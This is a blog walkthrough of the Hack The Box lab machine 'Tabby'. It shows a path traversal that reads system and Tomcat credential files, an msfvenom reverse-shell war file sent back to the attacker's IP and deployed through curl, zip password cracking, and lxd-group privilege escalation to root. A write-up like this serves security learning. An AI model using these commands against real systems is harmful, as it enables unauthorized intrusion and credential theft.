<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Writeup] Hack The Box: Tabby | ErbaZZ's Space</title><meta name=keywords content="writeup,walkthrough,htb,hackthebox"><meta name=description content="Here&rsquo;s my writeup for Tabby, a Linux box on Hack The Box. This one is created by egre55 and it is rated as Easy. The techniques required to clear Tabby are not complicated, but you need to connect the dots, using information/vulnerabilities from one component to gain access to other components.

"><meta name=author content="ErbaZZ"><link rel=canonical href=https://erbazz.me/writeup/htb_tabby/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://erbazz.me/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://erbazz.me/favicon.ico><link rel=apple-touch-icon href=https://erbazz.me/favicon.ico><link rel=mask-icon href=https://erbazz.me/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[Writeup] Hack The Box: Tabby"><meta property="og:description" content="Here&rsquo;s my writeup for Tabby, a Linux box on Hack The Box. This one is created by egre55 and it is rated as Easy. The techniques required to clear Tabby are not complicated, but you need to connect the dots, using information/vulnerabilities from one component to gain access to other components.

"><meta property="og:type" content="article"><meta property="og:url" content="https://erbazz.me/writeup/htb_tabby/"><meta property="og:image" content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="writeup"><meta property="article:published_time" content="2020-08-08T23:53:00+07:00"><meta property="article:modified_time" content="2020-08-08T23:53:00+07:00"><meta property="og:site_name" content="ErbaZZ's Space"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://erbazz.me/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Writeup] Hack The Box: Tabby"><meta name=twitter:description content="Here&rsquo;s my writeup for Tabby, a Linux box on Hack The Box. This one is created by egre55 and it is rated as Easy. The techniques required to clear Tabby are not complicated, but you need to connect the dots, using information/vulnerabilities from one component to gain access to other components.

"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://erbazz.me/writeup/"},{"@type":"ListItem","position":2,"name":"[Writeup] Hack The Box: Tabby","item":"https://erbazz.me/writeup/htb_tabby/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Writeup] Hack The Box: Tabby","name":"[Writeup] Hack The Box: Tabby","description":"Here\u0026rsquo;s my writeup for Tabby, a Linux box on Hack The Box. This one is created by egre55 and it is rated as Easy. The techniques required to clear Tabby are not complicated, but you need to connect the dots, using information/vulnerabilities from one component to gain access to other components.\n","keywords":["writeup","walkthrough","htb","hackthebox"],"articleBody":"Here’s my writeup for Tabby, a Linux box on Hack The Box. This one is created by egre55 and it is rated as Easy. The techniques required to clear Tabby are not complicated, but you need to connect the dots, using information/vulnerabilities from one component to gain access to other components.\nOS: Linux\nDifficulty: Easy\nPoints: 20\nRelease: 20 Jun 2020\nIP: 10.10.10.194\nBox Creator: egre55\nDate Cleared: 5 Aug 2020\nTL;DR  Use path traversal on the file variable of http://10.10.10.194/news.php to read a credential from /usr/share/tomcat9/etc/tomcat-users.xml Use the Tomcat credential found to deploy a war file through http://10.10.10.194:8080/manager/text/deploy Get a reverse shell through the uploaded war web app, and download an encrypted zip file inside /var/www/html/files Crack the zip password using fcrackzip and use that password to su to the user ash Use lxc to perform privilege escalation (https://www.hackingarticles.in/lxd-privilege-escalation/)  Information Gathering Starting with nmap scan, there are 3 ports available on the target: ssh on 22, and two http servers on 80 and 8080.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 8080/tcp open http Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 80 - HTTP The web server on port 80 has a website for MEGA HOSTING, a dedicated servers hosting service.\nThere is a message mentioning that the company is recovering from the data breach, with a link to the statement for that.\nI followed the link and it directed me to http://megahosting.htb/news.php?file=statement.\nI added the domain name with the IP address of the machine to the hosts file at /etc/hosts in order to access the page with the domain name. (Or you can just access the page directly without the domain name: http://10.10.10.194/news.php)\nThe statement is just a simple text saying about the breach. The interesting part is the file parameter in the URL.\nFrom the look of it, I guessed that news.php would get the file name from the file parameter and show the content of a file with that same name in a specific directory. I tried to do path traversal with ../../../../../ to traverse back to the root directory (/) and append the name of the file I wanted to read, and voila! I was able to read /etc/passwd.\nWith this, I could read any arbitrary file (with sufficient permission) on the machine given the path, which would surely be useful for the further steps.\n8080 - HTTP The port 8080 is hosting Apache Tomcat. The home page is a default page with the information on the paths where the components are located at. It also tells that there are the manager and host-manager web apps available.\nI tried to log in to both manager and host-manager using the default passwords, but failed.\nHowever, we do have the ability to read any file on the machine, so why don’t we just go ahead and read the config file for Tomcat?\nGaining Access With the knowledge of the installation paths from the home page, I searched for the default location of the config file containing the credentials for Tomcat manager. I looked through many paths until I found the package structure of Tomcat 9 from https://packages.debian.org/sid/all/tomcat9/filelist.\nWith that, using the news.php from port 80, I found the credential tomcat:$3cureP4s5w0rd123! by accessing http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml\nI was able to log in to the host-manager web app.\nUnfortunately, I couldn’t access the manager web app which I needed to deploy a reverse shell web app. The reason is that the tomcat user does not have the manager-gui which is required for accessing the page.\nIt does, however, have the manager-script role, which according to the Tomcat 9 Doc (https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html), can use the plaintext interface of the manager web app. Therefore, I could deploy a new web app through http://10.10.10.194:8080/manager/text/deploy.\nI created a reverse shell web app war file using the command msfvenom -p java/jsp_shell_reverse_tcp -f war LHOST=10.10.16.12 LPORT=443 -o rev.war\nI then deployed it to the server with curl --upload-file rev.war 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/rev'\nWith the web app deployed, I could get the reverse shell by opening a listener and access my reverse shell web app at http://10.10.10.194:8080/rev/\nSpawned a pty with python3.\nWith the shell, I found an interesting zip file in /var/www/html/files, so I downloaded it to my machine.\nI tried to unzip it and found that the zip is encrypted.\nWith fcrackzip, I went for a dictionary attack on the zip file with a common wordlist rockyou.txt, and found the password admin@it.\nfcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip\nWith the right password, I was able to unzip and view the files. However, nothing interesting was found in any of the files.\nFrom the /home directory of the target machine, we can see that there is a user named ash.\nI was able to log in successfully with the password of the zip file, and got the user flag.\nPrivilege Escalation The user ash is in the lxd group, which could be used to deploy a new container.\n LXD is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead. — https://linuxcontainers.org/lxd/introduction/\n With that permission, I found a blog (https://www.hackingarticles.in/lxd-privilege-escalation/) describing a trick that can be used to escalate the privilege by mounting the root directory (/) to a container in order to access the files with higher privilege.\nI built an image using a script from https://github.com/saghul/lxd-alpine-builder and uploaded it to the target machine.\nFollowing the instructions from the blog, I imported the uploaded image, created a container named escalate, mounted the root directory to the container, and started it.\nlxc image import alpine-v3.12-x86_64-20200804_2346.tar.gz --alias alpine lxc init alpine escalate -c security.privileged=true lxc config device add escalate whatever disk source=/ path=/mnt/root recursive=true lxc start escalate I then executed sh on the container and got access to all files on the machine, including the root flag.\nlxc exec escalate sh cat /mnt/root/root/root.txt ","wordCount":"988","inLanguage":"en","datePublished":"2020-08-08T23:53:00+07:00","dateModified":"2020-08-08T23:53:00+07:00","author":{"@type":"Person","name":"ErbaZZ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://erbazz.me/writeup/htb_tabby/"},"publisher":{"@type":"Organization","name":"ErbaZZ's Space","logo":{"@type":"ImageObject","url":"https://erbazz.me/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://erbazz.me/ accesskey=h title="ErbaZZ's Space (Alt + H)"><img src=https://erbazz.me/apple-touch-icon.png alt aria-label=logo height=35>ErbaZZ's Space</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://erbazz.me/ title=Home><span>Home</span></a></li><li><a href=https://erbazz.me/writeup/ title=Writeup><span>Writeup</span></a></li><li><a href=https://erbazz.me/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://erbazz.me/>Home</a>&nbsp;»&nbsp;<a href=https://erbazz.me/writeup/>Writeups</a></div><h1 class=post-title>[Writeup] Hack The Box: Tabby</h1><div class=post-meta><span title="2020-08-08 23:53:00 +0700 +07">August 8, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;988 words&nbsp;·&nbsp;ErbaZZ</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#information-gathering>Information Gathering</a><ul><li><a href=#80---http>80 - HTTP</a></li><li><a href=#8080---http>8080 - HTTP</a></li></ul></li><li><a href=#gaining-access>Gaining Access</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></details></div><div class=post-content><p>Here&rsquo;s my writeup for <strong>Tabby</strong>, a Linux box on Hack The Box. This one is created by <strong>egre55</strong> and it is rated as <em>Easy</em>. The techniques required to clear <strong>Tabby</strong> are not complicated, but you need to connect the dots, using information/vulnerabilities from one component to gain access to other components.</p><p><img loading=lazy src=/images/htb_tabby/info.png alt></p><p><strong>OS:</strong> Linux<br><strong>Difficulty:</strong> Easy<br><strong>Points:</strong> 20<br><strong>Release:</strong> 20 Jun 2020<br><strong>IP:</strong> 10.10.10.194<br><strong>Box Creator:</strong> egre55<br><strong>Date Cleared:</strong> 5 Aug 2020</p><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><ul><li>Use path traversal on the <code>file</code> variable of <code>http://10.10.10.194/news.php</code> to read a credential from <code>/usr/share/tomcat9/etc/tomcat-users.xml</code></li><li>Use the Tomcat credential found to deploy a war file through <a href=http://10.10.10.194:8080/manager/text/deploy>http://10.10.10.194:8080/manager/text/deploy</a></li><li>Get a reverse shell through the uploaded war web app, and download an encrypted zip file inside <code>/var/www/html/files</code></li><li>Crack the zip password using <code>fcrackzip</code> and use that password to <code>su</code> to the user <code>ash</code></li><li>Use <code>lxc</code> to perform privilege escalation (<a href=https://www.hackingarticles.in/lxd-privilege-escalation/>https://www.hackingarticles.in/lxd-privilege-escalation/</a>)</li></ul><h2 id=information-gathering>Information Gathering<a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>Starting with <code>nmap</code> scan, there are 3 ports available on the target: <code>ssh</code> on <code>22</code>, and two <code>http</code> servers on <code>80</code> and <code>8080</code>.</p><pre tabindex=0><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h3 id=80---http>80 - HTTP<a hidden class=anchor aria-hidden=true href=#80---http>#</a></h3><p>The web server on port <code>80</code> has a website for <strong>MEGA HOSTING</strong>, a dedicated servers hosting service.</p><p><img loading=lazy src=/images/htb_tabby/80_home.png alt></p><p>There is a message mentioning that the company is <em>recovering from the data breach</em>, with a link to the statement for that.</p><p>I followed the link and it directed me to <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a>.</p><p><img loading=lazy src=/images/htb_tabby/host_1.png alt></p><p>I added the domain name with the IP address of the machine to the <code>hosts</code> file at <code>/etc/hosts</code> in order to access the page with the domain name. (Or you can just access the page directly without the domain name: <a href=http://10.10.10.194/news.php>http://10.10.10.194/news.php</a>)</p><p><img loading=lazy src=/images/htb_tabby/host_2.png alt></p><p>The statement is just a simple text saying about the breach. The interesting part is the <code>file</code> parameter in the URL.</p><p><img loading=lazy src=/images/htb_tabby/80_breach.png alt></p><p>From the look of it, I guessed that <code>news.php</code> would get the file name from the <code>file</code> parameter and show the content of a file with that same name in a specific directory. I tried to do <strong>path traversal</strong> with <code>../../../../../</code> to traverse back to the root directory (<code>/</code>) and append the name of the file I wanted to read, and voila! I was able to read <code>/etc/passwd</code>.</p><p><img loading=lazy src=/images/htb_tabby/80_traverse.png alt></p><p>With this, I could read any arbitrary file <em>(with sufficient permission)</em> on the machine given the path, which would surely be useful for the further steps.</p><h3 id=8080---http>8080 - HTTP<a hidden class=anchor aria-hidden=true href=#8080---http>#</a></h3><p>The port <code>8080</code> is hosting <strong>Apache Tomcat</strong>. The home page is a default page with the information on the paths where the components are located at. It also tells that there are the <code>manager</code> and <code>host-manager</code> web apps available.</p><p><img loading=lazy src=/images/htb_tabby/8080_tomcat.png alt></p><p>I tried to log in to both <code>manager</code> and <code>host-manager</code> using the default passwords, but failed.</p><p><img loading=lazy src=/images/htb_tabby/8080_manager.png alt></p><p><img loading=lazy src=/images/htb_tabby/8080_hostmanager.png alt></p><p>However, we do have the ability to read any file on the machine, so why don&rsquo;t we just go ahead and read the config file for Tomcat?</p><h2 id=gaining-access>Gaining Access<a hidden class=anchor aria-hidden=true href=#gaining-access>#</a></h2><p>With the knowledge of the installation paths from the home page, I searched for the default location of the config file containing the credentials for Tomcat manager. I looked through many paths until I found the package structure of Tomcat 9 from <a href=https://packages.debian.org/sid/all/tomcat9/filelist>https://packages.debian.org/sid/all/tomcat9/filelist</a>.</p><p>With that, using the <code>news.php</code> from port <code>80</code>, I found the credential <code>tomcat:$3cureP4s5w0rd123!</code> by accessing <a href="http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml">http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml</a></p><p><img loading=lazy src=/images/htb_tabby/80_tomcatpass.png alt></p><p>I was able to log in to the <code>host-manager</code> web app.</p><p><img loading=lazy src=/images/htb_tabby/8080_hostmanager_success.png alt></p><p>Unfortunately, I couldn&rsquo;t access the <code>manager</code> web app which I needed to deploy a <strong>reverse shell</strong> web app. The reason is that the <code>tomcat</code> user does not have the <code>manager-gui</code> which is required for accessing the page.</p><p><img loading=lazy src=/images/htb_tabby/8080_manager_denied.png alt></p><p>It does, however, have the <code>manager-script</code> role, which according to the Tomcat 9 Doc (<a href=https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html>https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html</a>), can use the plaintext interface of the <code>manager</code> web app. Therefore, I could deploy a new web app through <a href=http://10.10.10.194:8080/manager/text/deploy>http://10.10.10.194:8080/manager/text/deploy</a>.</p><p><img loading=lazy src=/images/htb_tabby/tomcat9_doc.png alt></p><p>I created a reverse shell web app <code>war</code> file using the command <code>msfvenom -p java/jsp_shell_reverse_tcp -f war LHOST=10.10.16.12 LPORT=443 -o rev.war</code></p><p><img loading=lazy src=/images/htb_tabby/reverse_war.png alt></p><p>I then deployed it to the server with <code>curl --upload-file rev.war 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/rev'</code></p><p><img loading=lazy src=/images/htb_tabby/deploy.png alt></p><p>With the web app deployed, I could get the reverse shell by opening a listener and access my reverse shell web app at <a href=http://10.10.10.194:8080/rev/>http://10.10.10.194:8080/rev/</a></p><p><img loading=lazy src=/images/htb_tabby/rev.png alt></p><p>Spawned a pty with <code>python3</code>.</p><p><img loading=lazy src=/images/htb_tabby/pty.png alt></p><p>With the shell, I found an interesting zip file in <code>/var/www/html/files</code>, so I downloaded it to my machine.</p><p><img loading=lazy src=/images/htb_tabby/backup.png alt></p><p>I tried to unzip it and found that the zip is encrypted.</p><p><img loading=lazy src=/images/htb_tabby/encrypted.png alt></p><p>With <code>fcrackzip</code>, I went for a dictionary attack on the zip file with a common wordlist <code>rockyou.txt</code>, and found the password <code>admin@it</code>.</p><p><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip</code></p><p><img loading=lazy src=/images/htb_tabby/fcrackzip.png alt></p><p>With the right password, I was able to unzip and view the files. However, nothing interesting was found in any of the files.</p><p><img loading=lazy src=/images/htb_tabby/unzip.png alt></p><p>From the <code>/home</code> directory of the target machine, we can see that there is a user named <code>ash</code>.</p><p><img loading=lazy src=/images/htb_tabby/home.png alt></p><p>I was able to log in successfully with the password of the zip file, and got the user flag.</p><p><img loading=lazy src=/images/htb_tabby/user.png alt></p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>The user <code>ash</code> is in the <code>lxd</code> group, which could be used to deploy a new container.</p><blockquote><p>LXD is a next generation system container manager. It offers a user experience similar to virtual machines but using Linux containers instead.
— <a href=https://linuxcontainers.org/lxd/introduction/>https://linuxcontainers.org/lxd/introduction/</a></p></blockquote><p>With that permission, I found a blog (<a href=https://www.hackingarticles.in/lxd-privilege-escalation/>https://www.hackingarticles.in/lxd-privilege-escalation/</a>) describing a trick that can be used to escalate the privilege by mounting the <strong>root directory</strong> (<code>/</code>) to a container in order to access the files with higher privilege.</p><p>I built an image using a script from <a href=https://github.com/saghul/lxd-alpine-builder>https://github.com/saghul/lxd-alpine-builder</a> and uploaded it to the target machine.</p><p><img loading=lazy src=/images/htb_tabby/lxc_1.png alt></p><p>Following the instructions from the blog, I imported the uploaded image, created a container named escalate, mounted the root directory to the container, and started it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>lxc image import alpine-v3.12-x86_64-20200804_2346.tar.gz --alias alpine
</span></span><span class=line><span class=cl>lxc init alpine escalate -c security.privileged<span class=o>=</span><span class=nb>true</span>
</span></span><span class=line><span class=cl>lxc config device add escalate whatever disk <span class=nv>source</span><span class=o>=</span>/ <span class=nv>path</span><span class=o>=</span>/mnt/root <span class=nv>recursive</span><span class=o>=</span><span class=nb>true</span>
</span></span><span class=line><span class=cl>lxc start escalate
</span></span></code></pre></div><p><img loading=lazy src=/images/htb_tabby/lxc_2.png alt></p><p>I then executed <code>sh</code> on the container and got access to all files on the machine, including the root flag.</p><pre tabindex=0><code>lxc exec escalate sh
cat /mnt/root/root/root.txt
</code></pre></div><footer class=post-footer><ul class=post-tags><li><a href=https://erbazz.me/tags/writeup/>writeup</a></li><li><a href=https://erbazz.me/tags/walkthrough/>walkthrough</a></li><li><a href=https://erbazz.me/tags/htb/>htb</a></li><li><a href=https://erbazz.me/tags/hackthebox/>hackthebox</a></li></ul><nav class=paginav><a class=next href=https://erbazz.me/writeup/htb_magic/><span class=title>Next »</span><br><span>[Writeup] Hack The Box: Magic</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://erbazz.me/>ErbaZZ's Space</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerHTML="copy";function s(){e.innerHTML="copied!",setTimeout(()=>{e.innerHTML="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>